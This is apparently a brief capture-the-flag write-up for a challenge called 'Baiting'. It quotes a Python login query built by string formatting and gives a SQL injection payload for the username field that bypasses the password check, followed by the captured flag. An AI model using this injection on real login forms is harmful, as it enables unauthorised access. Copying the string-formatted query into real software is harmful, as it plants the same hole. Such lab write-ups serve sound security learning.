# Baiting

### Writeup by dvoak, 200 points

`That user list had a user called loginToGetFlag. Well, what are you waiting for?`

From breaking the SQL, we see `cur.execute("SELECT * FROM users WHERE username='{}' AND password='{}'".format("`


Simply, just make it username='loginToGetFlag' AND True -- -

Username field becomes: loginToGetFlag' AND True -- -

## Flag: ractf{injectingSQLLikeNobody'sBusiness}


